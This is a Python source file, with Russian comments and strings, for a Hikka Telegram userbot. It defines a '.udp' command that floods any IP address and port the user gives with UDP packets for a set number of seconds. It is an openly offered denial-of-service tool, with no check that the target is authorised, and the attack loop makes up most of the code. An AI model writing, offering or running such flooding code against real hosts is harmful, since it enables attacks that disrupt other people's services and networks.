import asyncio
import socket
from hikka.decorators import command
from hikka.tools import edit

# Импортируйте необходимые библиотеки и установите свой модуль
class UdpFloodModule:
    name = "UdpFlood"
    description = "Модуль для отправки UDP пакетов"
    author = "@openaicodex"

    @command(description="Отправляет UDP пакеты", usage=".udp ip port sec")
    async def udp(self, message, args):
        if len(args) != 3:
            return await edit(message, "Использование: .udp ip port sec")

        ip, port, sec = args
        port = int(port)
        sec = int(sec)

        await edit(message, f"Начинаем отправку пакетов на {ip}:{port} на {sec} секунд...")
        await self.udp_flood(ip, port, sec)
        await edit(message, "Отправка пакетов завершена.")

    async def udp_flood(self, ip, port, duration):
        """ Функция для отправки UDP пакетов """
        start_time = asyncio.get_event_loop().time()
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
            while True:
                if (asyncio.get_event_loop().time() - start_time) > duration:
                    break
                try:
                    sock.sendto(b'RandomData', (ip, port))
                except Exception as e:
                    print(f"Ошибка отправки: {e}")

        return True

# Создайте экземпляр вашего модуля
module = UdpFloodModule()
